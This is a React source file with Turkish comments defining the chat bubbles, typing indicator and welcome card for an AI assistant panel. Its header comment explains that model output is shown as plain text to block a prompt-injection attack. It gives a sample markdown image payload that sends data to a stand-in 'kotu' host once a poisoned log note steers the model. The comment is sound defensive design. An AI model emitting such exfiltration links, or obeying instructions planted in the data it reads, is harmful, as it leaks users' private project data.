"use client";

import { SparkleIcon } from "@/components/ui/icons";
import "./ai-panel.css";

/**
 * Sohbet baloncukları — `AI Chat.dc.html` 112-127 birebir.
 *
 * 🔴 MODEL ÇIKTISI DÜZ METİNDİR. Markdown çözülmez, HTML basılmaz,
 * `dangerouslySetInnerHTML` YOKTUR ve model metninden `<img>`/`<a href>`
 * ÜRETİLMEZ. Sebep ölçülmüş bir saldırı yolu: CSP `img-src 'self'` olduğu için
 * uzak bir görsel yüklenemez ama **istek yine de çıkar**; zehirlenmiş bir
 * şantiye günlüğü notu modele `![](https://kotu/?d=<veri>)` ürettirirse tarayıcı
 * o isteği kullanıcı TIKLAMADAN atar ve veri sızar. Düz metin bu vektörü
 * yapısal olarak kapatır — bir süzgeç değil, bir yokluk.
 *
 * 🔴 Mockup'ın 🤖 emojisi SVG'ye çevrildi: `symbol-subset-guard` U+1F916'yı
 * alt küme DIŞI sayıyor ve ubuntu-latest'te fontconfig ikamesine düşüyor —
 * yani görsel kare CI'da yereldekinden FARKLI çizilirdi. Anlam korunur
 * (asistan rozeti), taşıyıcı değişir.
 */

export interface AiUserMessageProps {
  metin: string;
}

export function AiUserMessage({ metin }: AiUserMessageProps) {
  return (
    <div className="ai-msg ai-msg--user">
      <div className="ai-bubble ai-bubble--user">{metin}</div>
    </div>
  );
}

export interface AiAssistantMessageProps {
  /** Model metni. `children` araç izlerini baloncuğun içine koyar. */
  metin: string;
  children?: React.ReactNode;
}

export function AiAssistantMessage({ metin, children }: AiAssistantMessageProps) {
  return (
    <div className="ai-msg ai-msg--assistant">
      <div className="ai-avatar" aria-hidden="true">
        <SparkleIcon />
      </div>
      <div className="ai-bubble ai-bubble--assistant">
        {children}
        {metin.length > 0 ? <p className="ai-bubble__text">{metin}</p> : null}
      </div>
    </div>
  );
}

/** Mockup 190-199: üç noktalı nabız animasyonu. */
export function AiTypingIndicator() {
  return (
    <div className="ai-msg ai-msg--assistant" data-testid="ai-yaziyor">
      <div className="ai-avatar" aria-hidden="true">
        <SparkleIcon />
      </div>
      <div className="ai-bubble ai-bubble--assistant ai-typing">
        <span className="ai-typing__dot" />
        <span className="ai-typing__dot" />
        <span className="ai-typing__dot" />
        <span className="ai-visually-hidden">Yanıt yazılıyor</span>
      </div>
    </div>
  );
}

export interface AiWelcomeProps {
  adSoyad: string | null;
}

/** Mockup 103-109: ortalanmış karşılama kartı. */
export function AiWelcome({ adSoyad }: AiWelcomeProps) {
  return (
    <div className="ai-welcome-wrap">
      <div className="ai-welcome">
        <div className="ai-welcome__emoji" aria-hidden="true">
          <SparkleIcon width={28} height={28} />
        </div>
        <p className="ai-welcome__title">FİİL AI Asistanı</p>
        <p className="ai-welcome__text">
          {adSoyad ? `Merhaba ${adSoyad}! ` : "Merhaba! "}
          Proje verilerinizi analiz edebilir ve sorularınızı yanıtlayabilirim. Yalnızca sizin
          yetkiniz olan verileri görebilirim.
        </p>
      </div>
    </div>
  );
}
